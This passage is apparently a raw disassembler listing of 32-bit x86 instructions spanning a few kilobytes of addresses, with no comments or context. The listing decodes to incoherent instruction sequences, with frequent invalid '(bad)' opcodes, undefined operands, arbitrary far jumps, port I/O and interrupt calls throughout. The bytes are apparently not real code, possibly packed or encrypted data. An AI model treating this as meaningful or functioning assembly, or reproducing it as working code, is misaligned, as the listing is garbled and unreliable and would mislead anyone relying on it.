  421559:	jmp    0x8add:0xc6ce18b3
  421560:	inc    eax
  421561:	cmp    bl,dh
  421563:	push   ecx
  421564:	or     eax,0x5bbd4b1f
  421569:	retf   0x86f0
  42156c:	outs   dx,BYTE PTR ds:[esi]
  42156d:	sahf   
  42156e:	dec    esi
  42156f:	sub    edi,DWORD PTR [ecx]
  421571:	sar    BYTE PTR [edi-0x267984f],0x40
  421578:	mov    edi,0xff9bbef
  42157d:	and    ebx,edx
  42157f:	sbb    BYTE PTR [edx],dh
  421581:	jmp    0xa1a24155
  421586:	jl     0x4215f7
  421588:	in     al,dx
  421589:	push   es
  42158a:	in     al,0xce
  42158c:	arpl   WORD PTR [eax-0x73],bp
  42158f:	dec    DWORD PTR [eax+0x2eb12ac1]
  421595:	aad    0xf6
  421597:	in     eax,0xe5
  421599:	cli    
  42159a:	jg     0x42159d
  42159c:	ret    0x675c
  42159f:	fucom  st(0)
  4215a1:	sbb    edi,DWORD PTR [ecx-0x29a489ae]
  4215a7:	dec    edx
  4215a8:	sub    bl,BYTE PTR [ecx+0x7ee727b3]
  4215ae:	jecxz  0x4215f3
  4215b0:	jae    0x421588
  4215b2:	inc    esp
  4215b3:	push   edx
  4215b4:	mov    edi,0x6b109d6f
  4215b9:	call   0xb997:0xde6fc255
  4215c0:	fsub   QWORD PTR [edi]
  4215c2:	test   BYTE PTR [ecx-0x30],dl
  4215c5:	int    0x89
  4215c7:	out    0x91,eax
  4215c9:	shl    bl,1
  4215cb:	repz or al,0xb1
  4215ce:	shl    DWORD PTR [ebx],0xcd
  4215d1:	mov    bh,0xa6
  4215d3:	out    0x3c,eax
  4215d5:	xor    al,cl
  4215d7:	fld    DWORD PTR [ecx+0x4fe250cb]
  4215dd:	cli    
  4215de:	retf   
  4215df:	jae    0x421564
  4215e1:	mov    ebx,0x6b9f4630
  4215e6:	add    al,0x81
  4215e8:	pop    esi
  4215e9:	inc    ebp
  4215ea:	sar    DWORD PTR [ebx+0x5c],1
  4215ed:	pusha  
  4215ee:	push   esp
  4215ef:	adc    esi,DWORD PTR [edi]
  4215f1:	or     BYTE PTR [edi+0x1d],dh
  4215f4:	imul   ecx,DWORD PTR [eax],0xffffffda
  4215f7:	mov    edi,DWORD PTR [edx+eax*2]
  4215fa:	into   
  4215fb:	push   edi
  4215fc:	sbb    cl,bh
  4215fe:	mov    ds:0x25c8ae9b,al
  421603:	scas   al,BYTE PTR es:[edi]
  421604:	dec    esp
  421605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421606:	out    0x62,eax
  421608:	sar    BYTE PTR [edi],cl
  42160a:	pushf  
  42160b:	sub    dl,BYTE PTR [eax]
  42160d:	test   al,0x10
  42160f:	aaa    
  421610:	ja     0x4215a1
  421612:	scas   al,BYTE PTR es:[edi]
  421613:	dec    ebx
  421614:	sub    ebp,0xffffffc0
  421617:	mov    esp,0x511c09c0
  42161c:	dec    edi
  42161d:	leave  
  42161e:	push   cs
  42161f:	lods   al,BYTE PTR ds:[esi]
  421620:	daa    
  421621:	sbb    ebx,DWORD PTR [eax-0x62]
  421624:	pop    ecx
  421625:	clc    
  421626:	loope  0x421656
  421628:	mov    ch,0x37
  42162a:	mov    al,0xd2
  42162c:	(bad)  
  42162d:	call   0x9833:0x47c0c90b
  421634:	adc    esi,ecx
  421636:	mov    cs,ecx
  421638:	nop
  421639:	enter  0x5e82,0x2f
  42163d:	push   es
  42163e:	add    BYTE PTR [ecx],al
  421640:	retf   0xab72
  421643:	rcr    BYTE PTR [ecx-0x63],1
  421646:	fstp   QWORD PTR [esi+0x27716d07]
  42164c:	aad    0x7c
  42164e:	cmp    DWORD PTR [esi-0xb],ebx
  421651:	fbld   TBYTE PTR [eax-0x47183981]
  421657:	adc    eax,0x7858b01c
  42165c:	call   0x81ba54a2
  421661:	add    DWORD PTR [ebp+0x32],ebp
  421664:	psubusw mm1,QWORD PTR [edi-0x43]
  421668:	cmp    eax,0xeec0b194
  42166d:	adc    bh,BYTE PTR [edx+0x620773a]
  421673:	jmp    0x61ab5d57
  421678:	test   DWORD PTR [edx+0x43],esp
  42167b:	pop    esi
  42167c:	xchg   edi,eax
  42167d:	inc    ecx
  42167e:	repnz in eax,dx
  421680:	mov    ebp,0x31a7c2b4
  421685:	fidiv  DWORD PTR [ebx]
  421687:	fnsave [edi-0x14]
  42168a:	es jge 0x42163c
  42168d:	jno    0x4216ea
  42168f:	sar    BYTE PTR ds:0xa268fb52,cl
  421695:	fcom   st(7)
  421697:	push   ebx
  421698:	loop   0x42168d
  42169a:	xchg   ecx,eax
  42169b:	sub    al,0xd2
  42169d:	cmc    
  42169e:	pop    esp
  42169f:	or     ah,BYTE PTR [edx+0x7da3aa29]
  4216a5:	test   al,0x74
  4216a7:	into   
  4216a8:	je     0x421651
  4216aa:	pop    esp
  4216ab:	sub    eax,0x57b66c94
  4216b0:	stos   DWORD PTR es:[edi],eax
  4216b1:	stos   DWORD PTR es:[edi],eax
  4216b2:	sbb    dl,BYTE PTR [ebp-0x41]
  4216b5:	dec    esp
  4216b6:	aaa    
  4216b7:	hlt    
  4216b8:	addr16 or cl,al
  4216bb:	xchg   DWORD PTR [esi-0x78],ebx
  4216be:	inc    ebx
  4216c0:	repz mov dh,0x92
  4216c3:	sar    bl,0x72
  4216c6:	mov    BYTE PTR [edi+0x66],ch
  4216c9:	ret    0xac3f
  4216cc:	pop    eax
  4216cd:	ds dec esi
  4216cf:	or     bh,bh
  4216d1:	xor    eax,0xf1d0d40
  4216d6:	ds cs dec edi
  4216d9:	push   0xd9f7229c
  4216de:	push   ecx
  4216df:	les    eax,FWORD PTR [esi+0x22]
  4216e2:	xchg   ebp,eax
  4216e3:	les    esi,FWORD PTR ds:0xe5fa55bd
  4216e9:	or     al,0x1c
  4216eb:	inc    ebp
  4216ec:	and    BYTE PTR [esi-0x2a],al
  4216ef:	(bad)  
  4216f0:	(bad)  
  4216f1:	fild   DWORD PTR ds:0x46c2dbc4
  4216f7:	pop    es
  4216f8:	(bad)  
  4216f9:	aad    0x37
  4216fb:	mov    ah,0x1a
  4216fd:	mov    cl,0x79
  4216ff:	xchg   esi,eax
  421700:	cmc    
  421701:	dec    ebp
  421702:	es daa 
  421704:	mov    bh,0xa2
  421706:	fadd   DWORD PTR [ebx-0x3f]
  421709:	inc    esi
  42170a:	sbb    ecx,DWORD PTR [eax+0x29]
  42170d:	jge    0x4216d8
  42170f:	ins    DWORD PTR es:[edi],dx
  421710:	lock aas 
  421712:	xchg   esp,eax
  421713:	ja     0x421773
  421715:	mov    DWORD PTR [ebp-0x3a5aac69],eax
  42171b:	test   BYTE PTR [esi+0x23098e86],0x18
  421722:	pushf  
  421723:	mov    edi,0xdc913db7
  421728:	jge    0x421786
  42172a:	sbb    al,0x8a
  42172c:	ins    DWORD PTR es:[edi],dx
  42172d:	inc    esi
  42172e:	cmpps  xmm0,XMMWORD PTR [edx+0x3e],0x44
  421733:	lock add eax,0x5115df35
  421739:	and    DWORD PTR [ebx],eax
  42173b:	mov    edi,0xc57fa3ee
  421740:	jno    0x421702
  421742:	mov    ch,0x53
  421744:	imul   BYTE PTR [ecx]
  421746:	div    BYTE PTR [ecx]
  421748:	es xchg edx,eax
  42174a:	rcl    BYTE PTR [ecx+eax*4-0x19],0x6e
  42174f:	dec    edi
  421750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421751:	ja     0x421798
  421753:	cmp    eax,0x3fb1837c
  421758:	nop
  421759:	(bad)  
  42175b:	jne    0x4217c5
  42175d:	push   esp
  42175e:	and    al,0x5f
  421760:	cmp    eax,0x3770dccc
  421765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421766:	ret    0x161
  421769:	cmp    bh,0x7f
  42176c:	and    BYTE PTR [eax-0x31],bh
  42176f:	mov    ch,0x4f
  421771:	pop    ds
  421772:	mov    bl,0xb6
  421774:	ror    DWORD PTR [ebx],0x7e
  421777:	into   
  421778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421779:	arpl   WORD PTR ds:0x90697484,cx
  42177f:	fwait
  421780:	call   0x96ee4fb4
  421785:	xchg   esp,eax
  421786:	(bad)  
  421787:	mov    dl,0x60
  421789:	fidivr DWORD PTR [edx]
  42178b:	cmp    al,0x96
  42178d:	dec    bl
  42178f:	outs   dx,DWORD PTR ds:[esi]
  421790:	xor    BYTE PTR [esi-0x6d],cl
  421793:	mov    ds:0x99fd2f11,al
  421798:	xor    DWORD PTR [ebx+0x58],edx
  42179b:	mov    cl,BYTE PTR [edi+0x20]
  42179e:	push   ebp
  42179f:	sbb    BYTE PTR [ebx],bl
  4217a1:	mov    al,ds:0x75645fc4
  4217a6:	jmp    0x84282a25
  4217ab:	mov    cl,0x2c
  4217ad:	das    
  4217ae:	inc    ebx
  4217af:	sbb    BYTE PTR [edi-0x60],dh
  4217b2:	(bad)  
  4217b3:	xor    ebp,DWORD PTR [eax]
  4217b5:	in     eax,0x5f
  4217b7:	ror    DWORD PTR [edi],1
  4217b9:	cmp    BYTE PTR [ecx+ebp*2],0x28
  4217bd:	jo     0x42181c
  4217bf:	pop    esi
  4217c0:	mov    dh,0xf1
  4217c2:	repnz push ds
  4217c4:	out    0xc5,eax
  4217c6:	dec    ebp
  4217c7:	cdq    
  4217c8:	ds xchg edx,eax
  4217ca:	rcl    BYTE PTR [ecx-0x4e],1
  4217cd:	(bad)  
  4217ce:	xchg   ebx,eax
  4217cf:	jmp    FWORD PTR [ecx]
  4217d1:	adc    dl,bl
  4217d3:	icebp  
  4217d4:	inc    ebp
  4217d5:	cmp    al,0xf9
  4217d7:	cld    
  4217d8:	sbb    DWORD PTR [eax],0xffffffb0
  4217db:	repnz inc esp
  4217dd:	aaa    
  4217de:	jne    0x421854
  4217e0:	lds    ebp,FWORD PTR [edi-0x7c4ebc9a]
  4217e6:	mov    ah,0x7c
  4217e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217e9:	in     al,dx
  4217ea:	push   ebp
  4217eb:	pop    edi
  4217ec:	sbb    ebp,ebx
  4217ee:	mov    bh,0x9b
  4217f0:	adc    DWORD PTR [esi],ecx
  4217f2:	sub    DWORD PTR [esi],0x61
  4217f5:	aam    0x64
  4217f7:	repnz xchg bh,dh
  4217fa:	mov    cl,0xad
  4217fc:	mov    eax,0xc7350727
  421801:	(bad)  
  421802:	call   0x3511115c
  421807:	loop   0x42187f
  421809:	sbb    DWORD PTR [ecx-0x47],edi
  42180c:	dec    ebx
  42180d:	or     eax,0x7c51d922
  421812:	dec    ebx
  421813:	jge    0x42180b
  421815:	out    dx,al
  421816:	test   BYTE PTR [esi+0x3b945d40],0x1e
  42181d:	shr    DWORD PTR [ecx],1
  42181f:	adc    al,0x92
  421821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421822:	icebp  
  421823:	jle    0x421886
  421825:	adc    BYTE PTR [edx-0x61],ah
  421828:	mov    dl,0xbf
  42182a:	cdq    
  42182b:	jmp    0x77f5e998
  421830:	retf   0xd255
  421833:	mov    esi,0x2a9ac222
  421838:	jp     0x421808
  42183a:	sub    BYTE PTR [esi],dl
  42183c:	mov    al,ds:0x4480350d
  421841:	ror    BYTE PTR [esi-0x3f],1
  421844:	int    0x21
  421846:	out    dx,eax
  421847:	adc    eax,0xbd57dc99
  42184c:	(bad)  
  42184d:	cmp    edx,ebp
  42184f:	ret    0xa5f2
  421852:	xchg   ebx,eax
  421853:	mov    eax,0x1e5bd9ad
  421858:	fisub  WORD PTR [eax-0x47a993a9]
  42185e:	or     dl,BYTE PTR [ebp+0x67c77dad]
  421864:	mov    bl,BYTE PTR [eax+0x73fcd870]
  42186a:	stos   DWORD PTR es:[edi],eax
  42186b:	fistp  WORD PTR ds:0x4c162ae8
  421871:	outs   dx,DWORD PTR ds:[esi]
  421872:	push   ebp
  421873:	loop   0x4218f4
  421875:	push   ebp
  421876:	xchg   edi,eax
  421877:	push   ebx
  421878:	outs   dx,DWORD PTR ds:[esi]
  421879:	add    BYTE PTR [esi-0x23],bl
  42187c:	inc    edx
  42187d:	fmul   QWORD PTR [eax+0x7d]
  421880:	jno    0x4218c0
  421882:	jno    0x421862
  421884:	icebp  
  421885:	mov    ecx,0xb52825da
  42188a:	inc    eax
  42188c:	sub    BYTE PTR [edi+esi*8+0x19],cl
  421890:	dec    ebx
  421891:	push   ds
  421892:	bound  ebx,QWORD PTR [edx-0x5a8fe94b]
  421898:	popa   
  421899:	dec    ebx
  42189a:	and    eax,0x40ec538
  42189f:	or     eax,0xa6f7fbca
  4218a4:	sbb    ch,BYTE PTR [ecx+0x9bf8c0b]
  4218aa:	sbb    ebp,DWORD PTR [edx+0x46]
  4218ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218ae:	scas   eax,DWORD PTR es:[edi]
  4218af:	adc    ch,0xee
  4218b2:	pop    esi
  4218b3:	mov    al,ds:0x597114a1
  4218b8:	adc    ecx,edx
  4218ba:	(bad)  
  4218bb:	aad    0xf5
  4218bd:	push   cs
  4218be:	loop   0x4218b2
  4218c0:	dec    ecx
  4218c1:	xlat   BYTE PTR ds:[ebx]
  4218c2:	jp     0x4218c1
  4218c4:	mov    dl,0xa8
  4218c6:	fstp   QWORD PTR [edi]
  4218c8:	fimul  WORD PTR [eax-0x4b]
  4218cb:	ja     0x4218a3
  4218cd:	sbb    BYTE PTR [ebp*1+0x260316cb],dl
  4218d4:	jp     0x4218d2
  4218d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218d7:	push   es
  4218d8:	shr    DWORD PTR [eax-0x653889da],1
  4218de:	data16 (bad) 
  4218e0:	scas   eax,DWORD PTR es:[edi]
  4218e1:	fidivr DWORD PTR [esi+0x4349a9e9]
  4218e7:	les    eax,FWORD PTR [ebp+0x32]
  4218ea:	mov    dh,0x36
  4218ec:	xor    BYTE PTR [edx],ah
  4218ee:	inc    edi
  4218ef:	push   eax
  4218f0:	cmp    DWORD PTR [eax-0x61],ebx
  4218f3:	xchg   edx,eax
  4218f4:	das    
  4218f5:	pop    edx
  4218f6:	or     edi,DWORD PTR [ebx+0x2e]
  4218f9:	push   esi
  4218fa:	jp     0x421921
  4218fc:	jge    0x421896
  4218fe:	dec    edx
  4218ff:	mov    ds:0x4d529db8,eax
  421904:	(bad)  
  421905:	xor    eax,0x318cbccb
  42190a:	sub    BYTE PTR [ebx-0xb],al
  42190d:	adc    dl,BYTE PTR [edi-0x1c4da9cc]
  421913:	adc    DWORD PTR ds:[eax+0x267e26a7],0x2f
  42191b:	lock xchg DWORD PTR [edx],ebp
  42191e:	push   eax
  42191f:	inc    ebx
  421920:	jmp    0xebd96736
  421925:	dec    ebx
  421926:	into   
  421927:	xchg   ecx,eax
  421928:	int3   
  421929:	xchg   ebp,eax
  42192a:	cmp    DWORD PTR [ecx+0x78],esi
  42192d:	xor    eax,0x1faeaadd
  421932:	push   ss
  421933:	add    eax,0xb2362388
  421938:	pop    ebx
  421939:	dec    ebx
  42193a:	es jp  0x4218fa
  42193d:	xor    al,0x6c
  42193f:	test   DWORD PTR [ecx-0x718a374a],edx
  421945:	lahf   
  421946:	sti    
  421947:	jle    0x421926
  421949:	push   0x57
  42194b:	push   0x17
  42194d:	push   es
  42194e:	pop    edx
  42194f:	(bad)  
  421950:	push   edi
  421951:	shl    DWORD PTR [ecx-0x7d],cl
  421954:	retf   0x55a4
  421957:	sti    
  421958:	mov    bh,0x23
  42195a:	jp     0x421940
  42195c:	or     al,0x34
  42195e:	cmp    ah,ch
  421960:	aaa    
  421961:	or     edi,DWORD PTR [edi*4-0x277a0343]
  421968:	mov    dl,0xf7
  42196a:	pop    esp
  42196b:	loope  0x4219a8
  42196d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42196e:	or     ecx,DWORD PTR [ebx-0x1c]
  421971:	or     al,0xbe
  421973:	in     al,dx
  421974:	not    DWORD PTR [ecx+edx*2+0x25b508db]
  42197b:	inc    ecx
  42197d:	xor    edi,eax
  42197f:	out    0xc8,eax
  421981:	clc    
  421982:	or     ah,BYTE PTR [edx+0x6dab941b]
  421988:	cs push 0x47cceb2
  42198e:	pop    ds
  42198f:	lock mov dl,0xec
  421992:	in     al,dx
  421993:	xchg   BYTE PTR [edi],ch
  421995:	push   ebp
  421996:	rol    dh,cl
  421998:	or     BYTE PTR [ebx],ah
  42199a:	(bad)  
  42199b:	cwde   
  42199c:	mov    esp,0x3dc75616
  4219a1:	cld    
  4219a2:	mov    edi,DWORD PTR [eax+0x394224dd]
  4219a8:	mov    ds:0xf582c632,al
  4219ad:	fidivr DWORD PTR [edi+ecx*2+0x41]
  4219b1:	loopne 0x4219db
  4219b3:	add    eax,edx
  4219b5:	js     0x42197f
  4219b7:	imul   esi,DWORD PTR [ecx+0x4a],0x43
  4219bb:	loop   0x421a1a
  4219bd:	inc    edi
  4219be:	dec    ecx
  4219bf:	or     DWORD PTR [ebp+0x65c4d357],ebx
  4219c5:	sub    ecx,DWORD PTR [esi+0x71]
  4219c8:	dec    ebx
  4219c9:	sbb    al,0xa4
  4219cb:	xchg   DWORD PTR [edi],edx
  4219cd:	gs cmp eax,0x488da42f
  4219d3:	push   edx
  4219d4:	sub    al,0x4e
  4219d6:	or     esi,edx
  4219d8:	loope  0x4219b3
  4219da:	cmp    eax,edi
  4219dc:	outs   dx,BYTE PTR ds:[esi]
  4219dd:	icebp  
  4219de:	sub    DWORD PTR [ebx],esi
  4219e0:	fidivr WORD PTR [edx+0x51]
  4219e3:	xor    BYTE PTR [ecx],cl
  4219e5:	popa   
  4219e6:	xchg   BYTE PTR [ebp-0x8],bl
  4219e9:	rcr    BYTE PTR [ecx+esi*4],cl
  4219ec:	inc    edi
  4219ed:	sbb    ebp,DWORD PTR [edx]
  4219ef:	in     al,0x1c
  4219f1:	sti    
  4219f2:	int3   
  4219f3:	mul    DWORD PTR [edi-0x1a8011cb]
  4219f9:	call   0x9ee7f3c4
  4219fe:	leave  
  4219ff:	xchg   BYTE PTR [edx],ah
  421a01:	aad    0xa2
  421a03:	jecxz  0x421a58
  421a05:	lock aad 0x3f
  421a08:	cmc    
  421a09:	sbb    esp,DWORD PTR [esi]
  421a0b:	xor    esp,ebx
  421a0d:	aam    0x97
  421a0f:	jg     0x421a2b
  421a11:	sbb    eax,0xf2e93210
  421a16:	das    
  421a17:	push   ss
  421a18:	inc    ebx
  421a19:	lods   eax,DWORD PTR ds:[esi]
  421a1a:	sbb    BYTE PTR [eax],dl
  421a1c:	ja     0x4219bf
  421a1e:	mov    esi,0xa2f20671
  421a23:	aam    0xfc
  421a25:	add    al,0xd4
  421a27:	mov    ebp,ebx
  421a29:	test   eax,0xb3896d12
  421a2e:	std    
  421a2f:	mov    ?,ebp
  421a31:	sub    ebp,DWORD PTR [ebx-0x56233da2]
  421a37:	dec    esi
  421a38:	xchg   BYTE PTR [edx+edi*2],dl
  421a3b:	jae    0x4219c8
  421a3d:	inc    eax
  421a3e:	call   FWORD PTR [edx]
  421a40:	fs and eax,0xb4dcb1b4
  421a46:	jmp    0x25dc:0x83121aff
  421a4d:	xor    edx,DWORD PTR [edi-0x2be6c5ac]
  421a53:	sub    edi,esi
  421a55:	ins    DWORD PTR es:[edi],dx
  421a56:	inc    eax
  421a57:	xchg   DWORD PTR [ecx-0x1242bec5],ebp
  421a5d:	(bad)  
  421a5e:	push   esi
  421a5f:	aad    0x92
  421a61:	dec    esi
  421a62:	jp     0x4219ec
  421a64:	cdq    
  421a65:	jge    0x421a2e
  421a67:	mov    dh,0x34
  421a69:	mov    bl,ah
  421a6b:	(bad)  
  421a6c:	fst    DWORD PTR [esi-0x28]
  421a6f:	pop    eax
  421a70:	sub    BYTE PTR [esi+0x75709393],0xe5
  421a77:	cwde   
  421a78:	ins    DWORD PTR es:[edi],dx
  421a79:	call   0x3685:0x4d4084d8
  421a80:	daa    
  421a81:	xchg   BYTE PTR [ebp-0xfa23ea8],dl
  421a87:	hlt    
  421a88:	fld    DWORD PTR [ebp+0xa08c46f]
  421a8e:	and    BYTE PTR [esp+ebx*1-0x44],dl
  421a92:	add    eax,0x983954f3
  421a97:	fidivr WORD PTR [ebp+eax*8+0x3590f6e2]
  421a9e:	stos   DWORD PTR es:[edi],eax
  421a9f:	xor    bh,BYTE PTR [ebp+0x1b75113d]
  421aa5:	mov    dh,0x2
  421aa8:	inc    edi
  421aa9:	adc    al,0xae
  421aab:	xor    ebx,ecx
  421aad:	mov    esp,0x659c7b91
  421ab2:	mov    dl,0x4
  421ab4:	icebp  
  421ab5:	popf   
  421ab6:	cmp    DWORD PTR [eax+eax*8-0x4e],0x473bc5a4
  421abe:	sti    
  421abf:	xchg   esp,eax
  421ac0:	push   es
  421ac1:	ror    BYTE PTR [ebx-0x65e9c438],1
  421ac7:	and    esp,edx
  421ac9:	popa   
  421aca:	jmp    0xfd3a:0x7f66a90d
  421ad1:	(bad)  
  421ad2:	loop   0x421a78
  421ad4:	inc    ebp
  421ad5:	sbb    DWORD PTR [esi+edi*8-0x2b],0xa1381742
  421add:	les    ebp,FWORD PTR [esi+0x4c]
  421ae0:	(bad)  
  421ae1:	xchg   bl,cl
  421ae3:	lods   eax,DWORD PTR ss:[esi]
  421ae5:	inc    ebp
  421ae6:	sbb    ax,0x630a
  421aea:	mov    edx,0x48e79596
  421aef:	sbb    al,0x82
  421af1:	clc    
  421af2:	adc    esi,DWORD PTR [edx+0x2f1d793]
  421af8:	scas   al,BYTE PTR es:[edi]
  421af9:	gs (bad) 
  421afb:	rcl    DWORD PTR [ecx-0x4d],0x4e
  421aff:	add    cl,0x3e
  421b02:	lods   eax,DWORD PTR ds:[esi]
  421b03:	retf   0x9cf
  421b06:	dec    edx
  421b07:	pop    edx
  421b08:	les    edx,FWORD PTR [eax-0x37d4ca72]
  421b0e:	mov    ebp,0x12da81e1
  421b13:	push   ebx
  421b14:	retf   
  421b15:	sub    eax,0xb07a4b8a
  421b1a:	and    al,0xaf
  421b1c:	out    dx,eax
  421b1d:	and    eax,DWORD PTR [ecx+edx*8+0x26cd07c7]
  421b24:	pop    edi
  421b25:	adc    DWORD PTR [ebp+0x2f],0xffffffdf
  421b29:	add    eax,0x28778868
  421b2e:	test   BYTE PTR [edi-0x52],0x1c
  421b32:	cmp    DWORD PTR [eax-0x2f],eax
  421b35:	shr    edi,cl
  421b37:	mov    DWORD PTR [ebx],ebp
  421b39:	outs   dx,DWORD PTR ds:[esi]
  421b3a:	cmp    eax,0x16d01f57
  421b3f:	hlt    
  421b40:	jge    0x421ae6
  421b42:	add    eax,0xddc62d70
  421b47:	adc    ch,dl
  421b49:	mov    DWORD PTR [eax],ecx
  421b4b:	arpl   WORD PTR [edi+0x23],si
  421b4e:	and    eax,0xbd4f93c7
  421b53:	add    cl,0x49
  421b56:	ret    0x6c63
  421b59:	cs rol bp,0xab
  421b5e:	or     al,0xc0
  421b60:	jg     0x421b44
  421b62:	and    al,0x8
  421b64:	push   ss
  421b65:	retf   0x228a
  421b68:	int    0x40
  421b6a:	jg     0x421b11
  421b6c:	cmp    DWORD PTR [esi],0xdcb3464
  421b72:	sbb    ebx,DWORD PTR [eax+0x34f265e0]
  421b78:	push   eax
  421b79:	cmp    dl,BYTE PTR [esi-0x1e8e5581]
  421b7f:	arpl   WORD PTR [ecx+esi*2+0x11],bx
  421b83:	and    eax,0x650da1b2
  421b88:	cmp    dh,0x8c
  421b8b:	dec    eax
  421b8c:	call   0x181:0x9a6ebd0a
  421b93:	fmulp  st(2),st
  421b95:	xchg   ebp,eax
  421b96:	and    DWORD PTR [eax-0x80],0x2cc3c54e
  421b9d:	push   esp
  421b9e:	inc    edx
  421b9f:	jmp    0xc966:0x490519d8
  421ba6:	loop   0x421bac
  421ba8:	or     ecx,ebx
  421baa:	mov    bh,0xdf
  421bac:	pop    esi
  421bad:	neg    DWORD PTR [eax+0x7fca972d]
  421bb3:	icebp  
  421bb4:	fwait
  421bb5:	aad    0x54
  421bb7:	sub    BYTE PTR [edx+0x79],bl
  421bba:	xchg   edi,eax
  421bbb:	rol    BYTE PTR [ebp+0x7f],0xaa
  421bbf:	cmc    
  421bc0:	sub    BYTE PTR [edi+0x6055f477],bh
  421bc6:	lock xor al,0x3b
  421bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bca:	dec    ebx
  421bcb:	fiadd  DWORD PTR cs:[ecx+0x357fd191]
  421bd2:	jae    0x421bdc
  421bd4:	xchg   bl,cl
  421bd6:	jmp    0x421b8f
  421bd8:	sub    dl,BYTE PTR ds:0xdecd07c9
  421bde:	pop    ss
  421bdf:	in     al,dx
  421be0:	into   
  421be1:	bound  ecx,QWORD PTR [esi]
  421be3:	and    cl,BYTE PTR [ecx+0x7c]
  421be6:	(bad)  
  421be7:	push   edx
  421be8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421be9:	mov    ?,ecx
  421beb:	jle    0x421c19
  421bed:	sub    ecx,DWORD PTR [esi]
  421bef:	(bad)  
  421bf0:	jge    0x421c6d
  421bf2:	sub    ah,bl
  421bf4:	iret   
  421bf5:	xor    ch,BYTE PTR [ebp-0x6b]
  421bf8:	and    al,0xf1
  421bfa:	push   ebp
  421bfb:	and    al,0xd
  421bfd:	call   0xe17034a0
  421c02:	push   edi
  421c03:	xchg   esi,eax
  421c04:	jg     0x421c7a
  421c06:	inc    ebp
  421c07:	bound  edx,QWORD PTR [ebp+0x31908fec]
  421c0d:	xlat   BYTE PTR ds:[ebx]
  421c0e:	fldcw  WORD PTR [esi+0x57]
  421c11:	test   BYTE PTR [edi+0x5f00a0ad],0x69
  421c18:	ja     0x421c61
  421c1a:	cmp    DWORD PTR [esi+ecx*4-0x36aea56b],edi
  421c21:	sar    DWORD PTR [edi+ecx*2+0x988ba5d],cl
  421c28:	mov    ebx,0x1e147e9b
  421c2d:	in     eax,0xb1
  421c2f:	xchg   edx,eax
  421c30:	pop    esi
  421c31:	pop    eax
  421c32:	push   cs
  421c33:	push   eax
  421c34:	jae    0x421c0c
  421c36:	add    BYTE PTR [eax+0x482e46b4],cl
  421c3c:	add    al,0xcd
  421c3e:	imul   edi,edx,0xeb2ba383
  421c44:	retf   
  421c45:	imul   esi,DWORD PTR [eax+ebp*8-0x6a959499],0x13
  421c4d:	js     0x421bd5
  421c4f:	or     al,0xa
  421c51:	mov    ah,0x7
  421c53:	xchg   esp,eax
  421c54:	xor    ah,bh
  421c56:	adc    edi,edx
  421c58:	push   esp
  421c59:	sbb    DWORD PTR [eax-0x43],esp
  421c5c:	push   0x39ef4ea6
  421c61:	xlat   BYTE PTR ds:[bx]
  421c63:	sti    
  421c64:	sbb    DWORD PTR [edi+0x3],edx
  421c67:	sub    esp,DWORD PTR [edi+0x675a131e]
  421c6d:	(bad)  
  421c6f:	loop   0x421cd0
  421c71:	les    ebp,FWORD PTR [ecx]
  421c73:	sub    al,0xa8
  421c75:	jne    0x421ca4
  421c77:	in     eax,0xc3
  421c79:	inc    edx
  421c7a:	or     eax,0x6149413a
  421c7f:	push   es
  421c80:	inc    eax
  421c81:	mov    dh,ah
  421c83:	push   cs
  421c84:	in     eax,dx
  421c85:	pusha  
  421c86:	xlat   BYTE PTR ds:[ebx]
  421c87:	(bad)  
  421c88:	adc    al,0x57
  421c8a:	dec    ecx
  421c8b:	aad    0x3c
  421c8d:	mov    dl,0x5e
  421c8f:	adc    al,0xc8
  421c91:	loop   0x421c73
  421c93:	repz mov dl,cl
  421c96:	dec    BYTE PTR [ecx]
  421c98:	pusha  
  421c99:	dec    ebx
  421c9a:	fnstcw WORD PTR [ecx+0x1aad5038]
  421ca0:	daa    
  421ca1:	sbb    dl,BYTE PTR [ebp+0x2c]
  421ca4:	arpl   sp,di
  421ca6:	dec    edx
  421ca7:	out    dx,eax
  421ca8:	out    0x6e,eax
  421caa:	mov    ebp,gs
  421cac:	stc    
  421cad:	jnp    0x421c95
  421caf:	jne    0x421c88
  421cb1:	mov    esi,0x73738de3
  421cb6:	push   ebp
  421cb7:	imul   ebp,ebp,0xb7f22724
  421cbd:	or     ebx,ebp
  421cbf:	mov    edx,0x7491e93e
  421cc4:	cmp    DWORD PTR [ebx+edx*1+0x36f0a130],ecx
  421ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ccc:	pop    eax
  421ccd:	jne    0x421d22
  421ccf:	rcr    DWORD PTR [eax],1
  421cd1:	stos   DWORD PTR es:[edi],eax
  421cd2:	scas   al,BYTE PTR es:[edi]
  421cd3:	cmp    al,0xc1
  421cd5:	jge    0x421d02
  421cd7:	fsub   QWORD PTR [edi-0x70]
  421cda:	cmp    eax,DWORD PTR [eax]
  421cdc:	pop    edx
  421cdd:	xchg   esp,eax
  421cde:	mov    ebp,0xf0d8345b
  421ce3:	mov    ecx,0xb8d94cdb
  421ce8:	loop   0x421c9b
  421cea:	mov    cl,BYTE PTR [esp+ebp*8-0x18186b04]
  421cf1:	out    dx,al
  421cf2:	dec    edi
  421cf3:	sub    BYTE PTR [esi-0x38],ah
  421cf6:	push   0xf56238ed
  421cfb:	gs popf 
  421cfd:	aad    0x91
  421cff:	sbb    esp,DWORD PTR [edi+0xa]
  421d02:	adc    al,0x23
  421d04:	cli    
  421d05:	pop    ecx
  421d06:	cmp    ah,BYTE PTR [ebp+0x3dce52e0]
  421d0c:	jg     0x421d63
  421d0e:	dec    esi
  421d0f:	leave  
  421d10:	ins    DWORD PTR es:[edi],dx
  421d11:	lahf   
  421d12:	in     eax,dx
  421d13:	pop    edi
  421d14:	out    dx,eax
  421d15:	sbb    dh,cl
  421d17:	pusha  
  421d18:	sahf   
  421d19:	and    cl,BYTE PTR [edi-0xdccb7f5]
  421d1f:	push   0xffffffd7
